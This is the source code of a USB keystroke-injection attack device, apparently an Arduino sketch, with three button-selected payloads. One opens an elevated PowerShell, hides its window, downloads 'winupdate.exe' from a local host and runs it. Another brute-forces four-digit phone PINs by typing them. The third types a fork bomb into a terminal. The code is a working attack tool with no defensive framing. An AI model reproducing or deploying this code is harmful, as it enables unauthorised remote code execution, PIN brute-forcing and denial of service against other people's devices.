#include <kb.h>
#include <windows.h>

extern uint8_t key[8];

void bd();
void phone();
void fb();

void setup() 
{
  kb_init();
  bool btnState;
  pinMode(2, INPUT);
  pinMode(3, INPUT);
  pinMode(4, INPUT);
  digitalWrite(2, 1);
  digitalWrite(3, 1);
  digitalWrite(4, 1);
  btnState = digitalRead(2);
  if(btnState == LOW) {
    bd();
  }
  btnState = digitalRead(3);
  if(btnState == LOW) {
    phone();
  }
  btnState = digitalRead(4);
  if(btnState == LOW) {
    fb();
  }
}

void loop() 
{
  // put your main code here, to run repeatedly:

}

void phone()
{
  for(int i = 30; i < 40 ; i++){
    for(int q = 30; q < 40; q++){
      for(int e = 30; e < 40; e++){
        for(int w = 30; w < 40; w++){
          writeKey(i, 0, 0);writeKey(q, 0, 0);
          writeKey(e, 0, 0);writeKey(w, 0, 0);
          DELAY;
        }
      }
    }
  }
}

void fb()
{
  writeKey(WINDOWS, 0, 0);
    delay(500);
    printKey("terminal");
    writeKey(KB_ENTER, 0, 0);
    delay(500);
    printKey(":(){ :|:& };:");
    writeKey(KB_ENTER, 0, 0);
}

void bd()
{
    WIND;
  DELAY;
  GUI;
  DELAY;
  printKey("powershell");
  DELAY;
  ADMIN_ENTER;
  DELAY;DELAY;DELAY;
  ALTO;
  DELAY;DELAY;DELAY;
  SYSMENU;
  writeKey(KB_L, 0, 0);
  DELAY;
  for(int i = 0; i < 300; i++)
    writeKey(KB_D_ARROW, 0, 0);
  DELAY;DELAY;
  ENTER;
  printKey("$client = new-object System.Net.WebClient");
  DELAY;
  ENTER;
  DELAY;
  printKey("$client.DownloadFile(\"http://192.168.1.16/winupdate.exe\",\"winupdate.exe\")");
  DELAY;
  ENTER;
  delay(2000);
  printKey(".\\winupdate.exe");
  DELAY;
  ENTER;
}
